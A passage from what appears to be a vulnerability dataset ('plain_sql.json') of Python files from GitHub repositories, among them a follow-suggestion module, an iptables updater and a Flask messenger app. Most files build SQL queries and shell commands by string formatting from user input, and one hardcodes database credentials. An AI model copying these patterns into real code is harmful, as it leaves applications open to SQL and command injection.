AVG(valence)\n    FROM all_songs_analysis\n    GROUP BY user_id\n    ''' % (users_tmp)\n    with cnx.cursor() as cursor:\n        cursor.execute(sql)\n        res = cursor.fetchall()\n    attributes_map = {}\n    for i in range(len(res)):\n        uid = res[i][0]\n        uattributes = np.array(res[i][1:])\n        attributes_map[uid] = uattributes\n\n    # Sort by cosine similarity\n    def _cosine_similarity(u, v):\n        try:\n            a = attributes_map[u]\n            b = attributes_map[v]\n        except KeyError:\n            return -2.  # Smaller than smallest possible cosine\n\n        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)\n\n    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))\n\n\ndef _get_degree_2(user_id, cnx):\n    \"\"\"Get all users of degree 2 follow that are not currently followed.\n    Example:\n        this user (follows) user B (follows) user B\n        AND user (does NOT follow) user B\n        means that user B will be in the list\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: list of user_ids\n    \"\"\"\n    sql = 'WITH tmp_suggest (followed_id) AS ' \\\n    '(' \\\n        'SELECT b.followed_id AS followed_id ' \\\n        'FROM ' \\\n            'tbl_follow a INNER JOIN tbl_follow b ' \\\n            'ON a.followed_id = b.follower_id ' \\\n        'WHERE a.follower_id = %s ' \\\n        'AND b.followed_id NOT IN ' \\\n            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \\\n        'AND b.followed_id != %s ' \\\n    ') ' \\\n    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \\\n    'GROUP BY followed_id ' \\\n    'ORDER BY num_mutual DESC'\n    with cnx.cursor() as cursor:\n        cursor.execute(sql, (user_id, user_id, user_id))\n        res = cursor.fetchall()\n    return list(map(lambda x: x[0], res))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/young-goons/rifflo-server/blob/62fb56c09a341b7bb73513e0b54317d95d8d1c05",
        "file_path": "/server/ygoons/modules/user/follow_suggest.py",
        "source": "\"\"\"\nFunctions for getting suggested users to follow.\n\"\"\"\nimport numpy as np\n\n\ndef get_suggest_follow(user_id, cnx):\n    \"\"\"Suggest users to follow.\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: ordered suggestion list of user_ids\n    \"\"\"\n    cands = _get_degree_2(user_id, cnx)\n    return _sort_similarity(user_id, cands, cnx)\n\n\ndef _sort_similarity(user_id, cands, cnx):\n    \"\"\"Get most similar users according to taste.\n    Args:\n        user_id (int): id of user to suggest for\n        cands (list(int)): ids of candidate users\n        cnx: DB connection\n\n    Returns:\n        list: cands ordered by decreasing similarity\n    \"\"\"\n    users_tmp = ', '.join(list(map(str, [user_id] + cands)))\n    sql = '''\n    WITH all_songs_analysis AS\n    (\n        SELECT\n            tbl_like.user_id AS user_id,\n            danceability,\n            energy,\n            loudness,\n            acousticness,\n            instrumentalness,\n            liveness,\n            valence\n        FROM\n            tbl_like JOIN tbl_post\n            ON (tbl_like.post_id = tbl_post.post_id)\n            JOIN tbl_music_analysis\n            ON (tbl_post.song_id = tbl_music_analysis.song_id)\n        WHERE tbl_like.user_id IN (%s)\n    )\n    SELECT\n        user_id,\n        AVG(danceability),\n        AVG(energy),\n        AVG(loudness),\n        AVG(acousticness),\n        AVG(instrumentalness),\n        AVG(liveness),\n        AVG(valence)\n    FROM all_songs_analysis\n    GROUP BY user_id\n    ''' % (users_tmp)\n    with cnx.cursor() as cursor:\n        cursor.execute(sql)\n        res = cursor.fetchall()\n    attributes_map = {}\n    for i in range(len(res)):\n        uid = res[i][0]\n        uattributes = np.array(res[i][1:])\n        attributes_map[uid] = uattributes\n\n    # Sort by cosine similarity\n    def _cosine_similarity(u, v):\n        try:\n            a = attributes_map[u]\n            b = attributes_map[v]\n        except KeyError:\n            return -2.  # Smaller than smallest possible cosine\n\n        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)\n\n    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))\n\n\ndef _get_degree_2(user_id, cnx):\n    \"\"\"Get all users of degree 2 follow that are not currently followed.\n    Example:\n        this user (follows) user B (follows) user B\n        AND user (does NOT follow) user B\n        means that user B will be in the list\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: list of user_ids\n    \"\"\"\n    sql = '''\n    WITH tmp_suggest (followed_id) AS\n    (\n        SELECT b.followed_id AS followed_id\n        FROM\n            tbl_follow a INNER JOIN tbl_follow b\n            ON a.followed_id = b.follower_id\n        WHERE a.follower_id = %s\n        AND b.followed_id NOT IN\n            (SELECT followed_id FROM tbl_follow WHERE follower_id = %s)\n        AND b.followed_id != %s\n    )\n    SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest\n    GROUP BY followed_id\n    ORDER BY num_mutual DESC\n    ''' % (user_id, user_id, user_id)\n    with cnx.cursor() as cursor:\n        cursor.execute(sql)\n        res = cursor.fetchall()\n    return list(map(lambda x: x[0], res))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/LHY-iS-Learning/RIOT/blob/34f6b67564e732c297ca3c4237431813b3e8300b",
        "file_path": "/WRT/update_ip.py",
        "source": "#!/opt/bin/python\n\nimport sqlite3\nfrom fetch_ip import get_dest_ip\nfrom subprocess import call\n\n#update database when new ACL is detected\ndef update_device_domains(device_dict):\n    try:\n        conn = sqlite3.connect('device.db')\n    except:\n        print \"[ERROR] Fail to connect to database\"\n        return\n    cursor = conn.cursor()\n\n    name = device_dict['mac_address']\n    domain = device_dict['domains'][0]['domain'][:-1]\n\n    query = \"SELECT NAME, HOSTNAME, DOMAIN, IP, PORT, PROTOCOL from DEVICE WHERE NAME = \" + \"'{0}'\".format(name) + \" AND DOMAIN = \" + \"'{0}'\".format(domain)\n    answer = cursor.execute(query)\n\n    ipList = []\n    port = ''\n    protocol = ''\n    hostName = ''\n\n    rules = answer.fetchall()\n    if len(rules):\n        print \"[INFO] \" + name + \" \" + str(len(rules)) + \" IPs for domain \" + domain + \" in the database\"\n    if rules:\n        for rule in rules:\n            hostName = rule[1]\n            ipList.append(rule[3])\n            port = rule[4]\n            protocol = rule[5]\n        \n        newIpList = get_dest_ip(domain)\n\n        if set(ipList) == set(newIpList):\n            print \"[INFO] IPs for domain {0} stay the same, do not change iptables\".format(domain)\n        else:\n            print \"[INFO] Start Updating Rules for domain {0}\".format(domain)\n            update_iptable(ipList, newIpList, str(port), str(protocol).upper(), domain, name, hostName)\n\n    conn.close()\n\ndef update_iptable(ipList, newIpList, port, protocol, domain, mac_addr, hostName):\n    # clear databse for the domain\n    conn = sqlite3.connect('device.db')\n    cursor = conn.cursor()\n    old_query = \"DELETE FROM DEVICE WHERE NAME = '{0}' AND DOMAIN = '{1}'\".format(mac_addr, domain)\n    cursor.execute(old_query)\n    conn.commit()\n\n    # remove old IP from iptables\n    for oldIp in ipList:\n        call('iptables -D FORWARD -p ' + protocol + ' -d '+ oldIp + ' --dport ' + port + ' -m mac --mac-source ' + mac_addr + ' -j ACCEPT', shell=True)\n        print \"[INFO] Remove old IP {0} from iptables\".format(oldIp)\n\n    # Append new\n    for newIp in newIpList:\n        # iptables\n        call('iptables -I FORWARD -p ' + protocol + ' -d '+ newIp + ' --dport ' + port + ' -m mac --mac-source ' + mac_addr + ' -j ACCEPT', shell=True)\n        print \"[INFO] Add new IP {0} to iptables\".format(newIp)\n        # database\n        query = \"INSERT INTO DEVICE(NAME, HOSTNAME, DOMAIN, IP, PORT, PROTOCOL) VALUES('{0}','{1}','{2}','{3}','{4}', '{5}')\".format(mac_addr, hostName, domain, newIp, port, protocol)\n        cursor.execute(query)\n        conn.commit()\n        print \"[INFO] Add new IP {0} to database\".format(newIp)\n    \n    conn.close()\n\ndef get_domain_list(pkt):\n    try:\n        conn = sqlite3.connect('device.db')\n    except:\n        print \"[ERROR] Fail to connect to database\"\n        return []\n    \n    cursor = conn.cursor()\n\n    query = \"SELECT DOMAIN FROM DEVICE WHERE NAME = '{0}'\".format(mac_addr)\n    answer = cursor.execute(query)\n\n    res = []\n    for domain in answer.fetchall():\n        res.append(domain)\n    \n    return list(set(res))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/app.py",
        "source": "from flask import Flask\n\napp = Flask(__name__, static_url_path='')\n\n# Parse Flask configuration\nfrom config import CONFIGURATION\napp.config.from_object(CONFIGURATION)\n\n#  Auth Manager\nfrom modules.AuthManager.routes import auth_module\napp.register_blueprint(auth_module)\n\n#  Profile Manager\nfrom modules.ProfileManager.routes import profile_module\napp.register_blueprint(profile_module)\n\n# #  Messages Manager\n# from MessagesManager.routes import messages_module\n# app.register_blueprint(messages_module)\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/modules/AuthManager/routes.py",
        "source": "from flask import Blueprint, request, redirect, jsonify, abort\nfrom modules.ProfileManager.api.db_methods import db_isAuthDataValid, db_addProfile, db_getProfileInfo, db_getUserID, \\\n    db_setLastVisit\nfrom modules.ProfileManager.api.db_methods import db_isProfileExists\nfrom modules.SessionControl.app import initRedis_db, generateSession\n# from flask_expects_json import expects_json\nfrom hashlib import sha256\nfrom modules.json_schemas import login_schema, register_schema\nimport jsonschema\nimport json\n\nauth_module = Blueprint('auth', __name__)\n\n\n@auth_module.route('/register', methods=['GET', 'POST'])\ndef hRegister():\n    if request.method == 'POST':\n        try:\n            data = json.loads(request.data)\n            jsonschema.validate(data, register_schema)\n        except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError):\n            return {'status': -1, 'message': '   JSON\\''}\n\n        if not data:\n            return jsonify({'status': 0, 'message': '   JSON\\''})\n\n        if not data['login'].isalpha():\n            return jsonify({'status': 0, 'message': ' \\'\\'       [a-Z]'})\n\n        if not data['login'] or not data['password'] or not data['first_name'] or not data['second_name']:\n            return jsonify({'status': 0, 'message': '   '})\n\n        data.update({'password': sha256(data['password'].encode()).hexdigest()})\n\n        if db_isProfileExists(data):\n            return jsonify({'status': 0, 'message': '     '})\n\n        return jsonify(db_addProfile(data))\n\n\n@auth_module.route('/', methods=['GET', 'POST'])\n@auth_module.route('/login', methods=['GET', 'POST'])\ndef hLogin():\n    r = initRedis_db()\n    if request.method == 'POST':\n        try:\n            data = json.loads(request.data)\n            jsonschema.validate(data, login_schema)\n        except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError):\n            return {'status': -1, 'message': '   '}\n\n        if not data:\n            return jsonify({'status': 0, 'message': '   JSON\\''})\n\n        if not data['login'] or not data['password']:\n            return jsonify({'status': 0, 'message': '   '})\n\n        if not data['login'].isalpha():\n            return jsonify({'status': 0, 'message': ' \\'\\'       [a-Z]'})\n\n        data.update({'password': sha256(data['password'].encode()).hexdigest()})\n\n        if not db_isAuthDataValid(data):\n            return jsonify({'status': 0, 'message': ' /'})\n\n        user_id = db_getUserID(data)\n        if db_getProfileInfo(user_id)['is_blocked']:\n            return jsonify({'status': 0, 'message': ' '})\n\n        db_setLastVisit(user_id)\n        generateSession(user_id, r)\n        return jsonify(db_getProfileInfo(user_id))\n\n\n# TODO:   JSON'  \n@auth_module.route('/logout', methods=['GET', 'POST'])\ndef logout():\n    try:\n        data = json.loads(request.data)\n        jsonschema.validate(data, login_schema)\n    except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError):\n        return {'status': -1, 'message': '   '}\n\n    r = initRedis_db()\n    r.delete(db_getUserID(data))\n    return jsonify({'status': 1})\n\n\n# TODO:   JSON'  \n@auth_module.route('/reset-password/', methods=['GET', 'POST'])\ndef hResetPW():\n    r = initRedis_db()\n    if request.method == 'POST':\n        data = json.loads(request.data)\n        r.delete(db_getUserID(data))\n        # data.update({'password': sha256(data['password'].encode())})  #    \n        return redirect('index')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/modules/MessagesManager/api/db_methods.py",
        "source": "from modules.database import sql_execute;\n\ndef db_addDialog(nameDialog):\n    sql = (\"INSERT INTO dialogs (name, created_at)\\n\"\n           \"VALUES ('%s', NOW())\"\n           ) % nameDialog\n    return {'status': 1}\n\ndef db_addUserInDialog(userID, dialogID, permission):\n    sql = (\"INSERT INTO dialogUser (dialog_id, user_id, permission)\\n\"\n           \"VALUES (%d, %d, %d)\"\n           ) % dialogID, userID, permission\n    return {'status': 1}\n\n\ndef db_addMessageForDialog(userID, content, dialogID, section_id=0):\n    sql = (\"INSERT INTO messages (dialog_id, content, created_at, user_id, section_id)\\n\"\n           \"VALUES (%d, '%s', NOW(), %d, %d)\"\n           ) % (dialogID, content, userID, section_id)\n    return {'status': 1}\n\ndef db_getMessagesFromDialog(dialogID):\n    sql = (\"SELECT user_id, content, created_at, section_id\\n\"\n           \"FROM messages\\n\"\n           \"WHERE dialog_id='%s'\"\n           ) % dialogID\n    return sql_execute(sql)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/modules/MessagesManager/routes.py",
        "source": "from flask import Blueprint, request\nfrom modules.MessagesManager.api.functions import db_getMessage, db_sendMessage\n\nmessages_module = Blueprint('messages', __name__)\n\n@messages_module.route('/message/send')\ndef send_message():\n    if request.method == 'PUT':\n        return db_sendMessage(request.get_json())\n\n\n@messages_module.route('/messages/<int:dialog_id>')\ndef get_message(dialog_id):\n    if request.method == 'GET':\n        return db_getMessage(dialog_id)\n\n\n@messages_module.route('/messages')\ndef get_message(dialog_id):\n    if request.method == 'GET':\n        return db_getMessage(dialog_id)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/modules/ProfileManager/api/db_methods.py",
        "source": "from database import sql_execute\n\n## DEVELOP METHODS\ndef db_addProfile(data):\n    sql='''\n        INSERT INTO users (first_name, second_name, created_at, last_visit, is_blocked, is_online, is_deleted) \n        VALUES ('{first_name}', '{second_name}', NOW(), NOW(), false, true, false) RETURNING id;\n    '''.format(**data)\n    user_id = sql_execute(sql, fetch_all=True)\n    sql = \"\"\"\n        INSERT INTO authentications (user_id, login, password) \n        VALUES ('{}', '{login}', '{password}');\n    \"\"\".format(user_id[0]['id'], **data)\n    sql_execute(sql, fetch_all=False)\n    return {'status': 1}\n\n\ndef db_isAuthDataValid(data):\n    sql='''\n        SELECT user_id\n        FROM authentications\n        WHERE login='{login}' AND password='{password}';\n    '''.format(**data)\n    answer = sql_execute(sql, fetch_all=False)\n\n    return bool(answer['user_id'])\n\n\ndef db_isProfileExists(data):\n    sql = \"SELECT count(login) FROM authentications \"\n\n    if type(data) == int:\n        sql += \"WHERE user_id='%d';\" % data\n    elif type(data) == dict:\n        sql += \"WHERE login='%(login)s';\" % data\n\n\n    users = sql_execute(sql, fetch_all=False)['count']\n    return bool(users)\n\n\ndef db_setLastVisit(ID):\n    sql='''\n        UPDATE users\n        SET last_visit = NOW()\n        WHERE id='%d';\n    ''' % ID\n    sql_execute(sql, fetch_all=False)\n\n\n\"\"\" \n#   . \n   True,   status   . \n  False,  .\n\"\"\"\ndef db_blockProfile(ID, status=True):\n    sql='''\n        UPDATE users\n        SET is_blocked='%s'\n        WHERE id='%d';\n    ''' % (status, ID)\n    sql_execute(sql, fetch_all=False)\n\n\n\ndef db_getUserID(data):\n    sql='''\n        SELECT user_id\n        FROM authentications\n        WHERE login='%(login)s';\n    ''' % data\n    user_id = sql_execute(sql, fetch_all=False)\n    return user_id['user_id']\n\n\n\n\n## PUBLIC METHODS\n\"\"\" \n#    . \n   True,   status   . \n  False,  .\n\"\"\"\ndef db_delProfile(ID, status=True):\n    # TODO:     \n    sql='''\n        UPDATE users \n        SET is_deleted='%s'\n        WHERE id='%d';\n    ''' % (status, ID)\n    return sql_execute(sql, fetch_all=True)\n\n\ndef db_FullDelProfile(ID):\n    # TODO:     \n    sql='''\n        DELETE FROM authentications\n        WHERE user_id='%d';\n        DELETE FROM users\n        WHERE id='%d';\n    ''' % (ID, ID)\n    sql_execute(sql, fetch_all=True)\n    return {'status': 1}\n\n\ndef db_getProfileInfo(ID):\n    sql='''\n        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked\n        FROM users\n        WHERE id='%d';\n    ''' % ID\n    return sql_execute(sql, fetch_all=False)\n\n\ndef db_getProfilesInfo():\n    sql='''\n        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked\n        FROM users;\n    '''\n    return sql_execute(sql, fetch_all=True)\n\n\ndef db_updateProfileInfo(ID, data):\n    rows = []\n    for key in data:\n        if not key in ('first_name', 'second_name'):\n            return {'status': 0, 'message': ' .    first_name/second_name'}\n\n        if data[key]:\n            sql='''\n                SELECT first_name, second_name\n                FROM users\n                WHERE id='%d'\n            ''' % ID\n            answer = sql_execute(sql, fetch_all=False)\n\n            if data[key] == answer[key]: #       ,   .\n                rows.append(key)\n                continue\n\n            sql = '''\n                UPDATE users\n                SET %s='%s' \n                WHERE id='%d';\n            ''' % (key, data[key], ID)\n            sql_execute(sql, fetch_all=False)\n\n    if not len(rows):\n        return {'status': 1}\n    elif len(rows) >= 1:\n        return {'status': 1, 'message': '  {}   '.format(rows)}\n    else:\n        return {'status': 0, 'message': '  {}   '.format(rows)}\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/modules/ProfileManager/routes.py",
        "source": "from flask import Blueprint, request, jsonify\nfrom modules.ProfileManager.api.db_methods import db_delProfile, db_getProfileInfo, db_getProfilesInfo, db_updateProfileInfo\nfrom modules.ProfileManager.api.db_methods import db_FullDelProfile, db_isProfileExists\nfrom modules.ProfileManager.api.functions import isProfileDeleted, isProfileBlocked\nimport json\n\nprofile_module = Blueprint('profile', __name__)\n\n@profile_module.route('/profile/<int:ID>', methods=['GET', 'PUT', 'DELETE'])\ndef profile(ID):\n    if not db_isProfileExists(ID):\n        return jsonify({'status': 1, 'message': '   '})\n\n    if request.method == 'GET':\n        return jsonify(db_getProfileInfo(ID))\n\n    else:\n        if request.method == 'PUT':\n            data = json.loads(request.data)\n            if isProfileDeleted(ID):\n                return jsonify({'status': 0, 'message': '    '})\n\n            if isProfileBlocked(ID):\n                return jsonify({'status': 0, 'message': '   '})\n\n            return jsonify(db_updateProfileInfo(ID, data))\n\n        elif request.method == 'DELETE':\n            if isProfileDeleted(ID):\n                return jsonify({'status': 0, 'message': '  '})\n\n            #return db_delProfile(ID, status=True)\n            return jsonify(db_FullDelProfile(ID))\n\n\n@profile_module.route('/profiles')\ndef profiles():\n    return jsonify(db_getProfilesInfo())",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/modules/SessionControl/app.py",
        "source": "from flask import redirect, make_response\nfrom random import randint\n\nimport redis\nimport uuid\nimport time\n\n\ndef initRedis_db():\n    r = redis.Redis(host='127.0.0.1',port=6379,db=0)\n    return r\n\n\ndef generateSession(user_id, r):\n    salt = ''.join([chr(randint(97, 122)) for _ in range(32)])\n    generate_uuid = str(uuid.uuid3(uuid.NAMESPACE_DNS, str(user_id + time.time()) + salt))\n\n    r.set(generate_uuid, user_id)\n    response = make_response(redirect('set_cookie'))\n    response.set_cookie('SESSION', bytes(generate_uuid, 'utf-8'))",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/src/modules/database.py",
        "source": "import psycopg2\nfrom psycopg2.extras import RealDictCursor\n\ndef sql_execute(query, fetch_all=True):\n    conn = psycopg2.connect(dbname='messenger_1', user='messenger_1', password='messenger_1', host='90.189.168.29')\n    cursor = conn.cursor(cursor_factory=RealDictCursor)\n\n    answer = None\n    cursor.execute(query)\n    conn.commit()\n    try:\n        if fetch_all:\n            answer = cursor.fetchall()\n        else:\n            answer = cursor.fetchone()\n    except psycopg2.Error as err:\n        return {'error': err}\n    finally:\n        cursor.close()\n        conn.close()\n        return answer\n        #     return {'status': 1}\n        # elif answer is None:\n        #     return {'status': 'Unknown'}\n        # else:\n        #     return answer",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/e7e207cfb8a0e88aef44c930d3d86d87faf14fb3",
        "file_path": "/tests/tests.py",
        "source": "import unittest\nimport requests\nimport json\nimport random\n\nclass TestProfile(unittest.TestCase):\n    def test_add_user(self):\n        for _ in range(3):\n            string = ''.join([chr(random.randint(65, 90)) for _ in range(9)])\n            data = {\n                'first_name': string,\n                'second_name': string,\n                'login': string,\n                'password': string,\n            }\n            print(data)\n            resp = requests.post('http://127.0.0.1:5000/register', json=data)\n            print(resp.text)\n            response = json.loads(resp.text)\n            self.assertEqual(resp.status_code, 200)\n            self.assertEqual(response['status'], 1)\n            print('/register test_add_user: {}'.format(resp.text))\n\n    def test_b_get_user(self):\n        resp = requests.get('http://127.0.0.1:5000/profiles')\n        self.assertEqual(resp.status_code, 200)\n        self.assertIsNotNone(resp.text)\n        print('/profiles get_user: {}'.format(resp.text))\n        users = json.loads(resp.text)\n        for user in users:\n            resp = requests.get('http://127.0.0.1:5000/profile/{}'.format(user['id']))\n            response = json.loads(resp.text)\n            print('/profile/{} get_user: {}'.format(user['id'], response))\n            self.assertEqual(resp.status_code, 200)\n            self.assertIsNotNone(resp.text)\n            self.assertGreater(response['id'], 0)\n\n\n    def test_c_login_user(self):\n        resp = requests.get('http://127.0.0.1:5000/profiles')\n        self.assertEqual(resp.status_code, 200)\n        self.assertIsNotNone(resp.text)\n        users = json.loads(resp.text)\n        for user in users:\n            if user['id'] != 191:\n                data = {\n                    'login': user['first_name'],\n                    'password': user['first_name'],\n                }\n                resp = requests.post('http://127.0.0.1:5000/login', json=data)\n                print('/login login_user: {}'.format(resp.text))\n                self.assertEqual(resp.status_code, 200)\n                self.assertGreater(user['id'], 0)\n                self.assertIsNotNone(resp.text)\n\n\n                data = {\n                    'login': '',\n                    'password': '',\n                }\n                resp = requests.post('http://127.0.0.1:5000/login', json=data)\n                self.assertEqual(resp.status_code, 200)\n                self.assertGreater(user['id'], 0)\n                self.assertIsNotNone(resp.text)\n                print('/login login_user: {}'.format(resp.text))\n\n    def test_d_update_user(self):\n        string = ''.join([chr(random.randint(33, 126)) for _ in range(9)])\n        resp = requests.get('http://127.0.0.1:5000/profiles')\n        self.assertEqual(resp.status_code, 200)\n        self.assertIsNotNone(resp.text)\n        users = json.loads(resp.text)\n        for user in users:\n            if user['id'] != 191:\n                #  .    fist_name/second_name\n                data = {\n                    string: string,\n                    string: string,\n                }\n                resp = requests.put('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)\n                response = json.loads(resp.text)\n                print(response)\n                self.assertEqual(resp.status_code, 200)\n                self.assertIsNotNone(resp.text)\n                self.assertEqual(response['status'], 0)\n                self.assertIsNotNone(response['message'])\n                print('[1] /profile/{} update_user: {}'.format(user['id'], resp.text))\n\n                # 1     \n                resp = requests.get('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)\n                response = json.loads(resp.text)\n                data = {\n                    'first_name': response['first_name'],\n                    'second_name': string,\n                }\n                resp = requests.put('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)\n                response2 = json.loads(resp.text)\n                self.assertEqual(resp.status_code, 200)\n                self.assertEqual(response2['status'], 1)\n                self.assertIsNotNone(response2['message'])\n                print('[2] /profile/{} update_user: {}'.format(user['id'], resp.text))\n\n                # {'status': 1}\n                data = {\n                    'first_name': string + 'a',\n                    'second_name': string + 'a',\n                }\n                resp = requests.put('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)\n                response = json.loads(resp.text)\n                self.assertEqual(resp.status_code, 200)\n                self.assertEqual(response['status'], 1)\n                print('[3] /profile/{} update_user: {}'.format(user['id'], resp.text))\n\n\n    def test_e_del_user(self):\n        resp = requests.get('http://127.0.0.1:5000/profiles')\n        self.assertEqual(resp.status_code, 200)\n        self.assertIsNotNone(resp.text)\n        users = json.loads(resp.text)\n        for user in users:\n            if user['id'] != 191:\n                resp = requests.delete('http://127.0.0.1:5000/profile/{}'.format(user['id']))\n                response = json.loads(resp.text)\n                self.assertEqual(resp.status_code, 200)\n                self.assertIsNotNone(resp.text)\n                self.assertEqual(response['status'], 1)\n                print('/profile/{} del_user: {}'.format(user['id'], resp.text))\n\n\nif __name__ == '__main__':\n    unittest.main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/55358550a7978887d62d7dbd241dc846b30997a4",
        "file_path": "/src/modules/AuthManager/routes.py",
        "source": "from flask import Blueprint, request, redirect, jsonify, make_response\nfrom modules.ProfileManager.api.db_methods import db_isAuthDataValid, db_addProfile, db_getProfileInfo, db_getUserID\nfrom modules.ProfileManager.api.db_methods import db_setLastVisit\nfrom modules.ProfileManager.api.db_methods import db_isProfileExists\nfrom modules.AuthManager.SessionControl.app import initRedis_db\nfrom modules.json_validator import json_validate\nfrom modules.json_schemas import login_schema, register_schema\nfrom hashlib import sha256\nfrom random import randint\nimport uuid\nimport json\nimport re\nimport time\n\nauth_module = Blueprint('auth', __name__)\n\n\n@auth_module.route('/register', methods=['GET', 'POST'])\ndef hRegister():\n    if request.method == 'POST':\n        data = json_validate(request.data, register_schema)\n\n        if not data:\n            return jsonify({'status': 0, 'message': '   JSON\\''})\n\n        if ''.join(re.findall(r'\\w+', data['login'])) != data['login']:\n            return jsonify({'status': 0, 'message': '       '})\n\n        if ''.join(re.findall(r'\\w+', data['password'])) != data['password']:\n            return jsonify({'status': 0, 'message': '       '})\n\n        if not data['login'] or not data['password'] or not data['first_name'] or not data['second_name']:\n            return jsonify({'status': 0, 'message': '   '})\n\n        data.update({'password': sha256(data['password'].encode()).hexdigest()})\n\n        if db_isProfileExists(data):\n            return jsonify({'status': 0, 'message': '     '})\n\n        return jsonify(db_addProfile(data))\n\n\n@auth_module.route('/', methods=['GET', 'POST'])\n@auth_module.route('/login', methods=['GET', 'POST'])\ndef hLogin():\n    r = initRedis_db()\n    if request.method == 'POST':\n        data = json_validate(request.data, login_schema)\n\n        if not data:\n            return jsonify({'status': 0, 'message': '   JSON\\''})\n\n        if not data['login'] or not data['password']:\n            return jsonify({'status': 0, 'message': '   '})\n\n        if ''.join(re.findall(r'\\w+', data['login'])) != data['login']:\n            return jsonify({'status': 0, 'message': '       '})\n\n        if ''.join(re.findall(r'\\w+', data['password'])) != data['password']:\n            return jsonify({'status': 0, 'message': '       '})\n\n        data.update({'password': sha256(data['password'].encode()).hexdigest()})\n\n        if not db_isAuthDataValid(data):\n            return jsonify({'status': 0, 'message': ' /'})\n\n        user_id = db_getUserID(data)\n        if db_getProfileInfo(user_id)['is_blocked']:\n            return jsonify({'status': 0, 'message': ' '})\n\n        db_setLastVisit(user_id)\n\n        salt = ''.join([chr(randint(97, 122)) for _ in range(32)])\n        generate_uuid = str(uuid.uuid3(uuid.NAMESPACE_DNS, str(user_id + time.time()) + salt))\n\n        #return jsonify(db_getProfileInfo(user_id))\n        r.set(generate_uuid, user_id)\n        response = make_response(redirect('/profile/{}'.format(user_id)))\n        response.set_cookie('SESSION', bytes(generate_uuid, 'utf-8'))\n        return response\n\n\n# # TODO:   JSON'  \n# @auth_module.route('/logout', methods=['GET', 'POST'])\n# def logout():\n#     r = initRedis_db()\n#     r.delete(db_getUserID(data))\n#     return jsonify({'status': 1})\n\n\n# TODO:   JSON'  \n@auth_module.route('/reset-password/', methods=['GET', 'POST'])\ndef hResetPW():\n    r = initRedis_db()\n    if request.method == 'POST':\n        UUID = request.cookies.get('SESSION')\n        r.delete(db_getUserID(uuid))\n        # data.update({'password': sha256(data['password'].encode())})  #    \n        return redirect('index')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/55358550a7978887d62d7dbd241dc846b30997a4",
        "file_path": "/src/modules/ProfileManager/api/db_methods.py",
        "source": "from database import sql_execute\n\n## DEVELOP METHODS\ndef db_addProfile(data):\n    sql='''\n        INSERT INTO users (first_name, second_name, created_at, last_visit, is_blocked, is_online, is_deleted) \n        VALUES ('{first_name}', '{second_name}', NOW(), NOW(), false, true, false) RETURNING id;\n    '''.format(**data)\n    user_id = sql_execute(sql, fetch_all=True)\n    sql = \"\"\"\n        INSERT INTO authentications (user_id, login, password) \n        VALUES ('{:d}', '{login}', '{password}');\n    \"\"\".format(user_id[0]['id'], **data)\n    sql_execute(sql, fetch_all=False)\n    return {'status': 1}\n\n\ndef db_isAuthDataValid(data):\n    print(data)\n    sql='''\n        SELECT user_id\n        FROM authentications\n        WHERE login='{login}' AND password='{password}';\n    '''.format(**data)\n    answer = sql_execute(sql, fetch_all=False)\n    return True if answer is not None else False\n\n    #return bool(answer['user_id'])\n\n\ndef db_isProfileExists(data):\n    sql = \"SELECT count(login) FROM authentications \"\n\n    if type(data) == int:\n        sql += \"WHERE user_id='{:d}';\".format(data)\n    elif type(data) == dict:\n        sql += \"WHERE 